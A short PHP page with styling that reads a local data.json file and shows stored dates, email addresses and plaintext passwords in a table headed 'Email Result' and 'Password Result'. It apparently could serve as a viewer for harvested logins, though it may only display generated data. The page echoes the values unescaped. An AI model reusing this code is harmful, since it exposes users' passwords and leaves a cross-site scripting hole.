<style>
    body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    color: white;
    background-image: linear-gradient(black, rgb(100, 43, 43), #0c2f35);
}

.container {
    max-width: 600px;
    margin: 0 auto;
    padding: 20px;
    text-align: center;
}
.traa {
    text-align: center;
    color: white;
    margin-top: 10rem;
}
.container h1 {
    text-align: center;
}
.container h2 {
    text-align: center;
}

form {
    margin-bottom: 20px;
}

table {
    width: 100%;
    border-collapse: collapse;
}

table, th, td {
    border: 1px solid #ddd;
}

th, td {
    padding: 8px;
    text-align: left;
}

button {
    padding: 10px 15px;
    background-color: #4CAF50;
    color: white;
    border: none;
    cursor: pointer;
}

button:hover {
    background-color: #45a049;
}

</style>

<div id="dataContainer">
    <?php
    // Menampilkan data yang sudah disimpan dalam format tabel
    $data = json_decode(file_get_contents('data.json'), true) ?: [];
    if ($data): ?>
        <table>
            <thead>
                <tr>
                    <th>TTL Result</th>
                    <th>Email Result</th>
                    <th>Password Result</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($data as $row): ?>
                    <tr>
                        <td><?php echo $row['tanggal']; ?></td>
                        <td><?php echo $row['email']; ?></td>
                        <td><?php echo $row['password']; ?></td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    <?php else: ?>
        <p>No data generated yet.</p>
    <?php endif; ?>
</div>
